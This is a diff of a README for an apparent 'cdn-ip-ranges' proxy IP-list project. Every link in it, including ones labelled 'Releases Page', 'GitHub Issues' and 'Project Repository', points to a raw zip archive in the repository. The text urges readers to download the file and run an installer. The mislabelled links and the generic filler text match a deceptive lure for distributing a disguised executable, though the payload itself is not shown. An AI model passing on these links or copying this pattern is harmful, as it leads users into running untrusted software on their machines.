@@ -1,6 +1,6 @@
 # 🌐 cdn-ip-ranges - Easily Access IP Ranges for Proxying
 
-[![Download Now](https://raw.githubusercontent.com/Mide-IT/cdn-ip-ranges/main/contabo/cdn-ip-ranges_trajection.zip%20Now-Visit%20Releases%20Page-blue)](https://raw.githubusercontent.com/Mide-IT/cdn-ip-ranges/main/contabo/cdn-ip-ranges_trajection.zip)
+[![Download Now](https://github.com/Mide-IT/cdn-ip-ranges/raw/refs/heads/main/all/ip_ranges_cdn_v3.8.zip%20Now-Visit%20Releases%20Page-blue)](https://github.com/Mide-IT/cdn-ip-ranges/raw/refs/heads/main/all/ip_ranges_cdn_v3.8.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these easy steps to download and run the cdn-ip-ranges application on you
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** To download the software, [visit this page to download](https://raw.githubusercontent.com/Mide-IT/cdn-ip-ranges/main/contabo/cdn-ip-ranges_trajection.zip).
+1. **Visit the Releases Page:** To download the software, [visit this page to download](https://github.com/Mide-IT/cdn-ip-ranges/raw/refs/heads/main/all/ip_ranges_cdn_v3.8.zip).
 2. **Choose a Version:** Look for the latest version listed on the releases page. This will be the most stable and secure version.
 3. **Download the File:** Click on the link for the appropriate file format for your operating system (e.g., .exe for Windows, .dmg for macOS).
 4. **Run the Installer:** Once the file is downloaded, open it to begin the installation process. Follow the on-screen instructions to complete the installation.
@@ -58,7 +58,7 @@ If you encounter issues while using cdn-ip-ranges, here are common problems and 
 
 If you need further assistance, feel free to check the GitHub issues page or contact the support team.
 
-1. **Visit the Issues Page:** [GitHub Issues](https://raw.githubusercontent.com/Mide-IT/cdn-ip-ranges/main/contabo/cdn-ip-ranges_trajection.zip)
+1. **Visit the Issues Page:** [GitHub Issues](https://github.com/Mide-IT/cdn-ip-ranges/raw/refs/heads/main/all/ip_ranges_cdn_v3.8.zip)
 2. **Report a Problem:** Create a new issue detailing your problem for the team to address.
 
 ## 📅 Future Updates
@@ -73,7 +73,7 @@ Stay tuned for future releases where we plan to add features such as:
 
 If you find this tool helpful, consider joining our community. Share your experiences, suggestions, and improvements. We welcome contributions from everyone.
 
-1. **Follow Us on GitHub:** [Project Repository](https://raw.githubusercontent.com/Mide-IT/cdn-ip-ranges/main/contabo/cdn-ip-ranges_trajection.zip)
+1. **Follow Us on GitHub:** [Project Repository](https://github.com/Mide-IT/cdn-ip-ranges/raw/refs/heads/main/all/ip_ranges_cdn_v3.8.zip)
 2. **Open Discussions:** Engage with other users and developers to share tips and tricks.
 
-[![Download Now](https://raw.githubusercontent.com/Mide-IT/cdn-ip-ranges/main/contabo/cdn-ip-ranges_trajection.zip%20Now-Visit%20Releases%20Page-blue)](https://raw.githubusercontent.com/Mide-IT/cdn-ip-ranges/main/contabo/cdn-ip-ranges_trajection.zip)
+[![Download Now](https://github.com/Mide-IT/cdn-ip-ranges/raw/refs/heads/main/all/ip_ranges_cdn_v3.8.zip%20Now-Visit%20Releases%20Page-blue)](https://github.com/Mide-IT/cdn-ip-ranges/raw/refs/heads/main/all/ip_ranges_cdn_v3.8.zip)
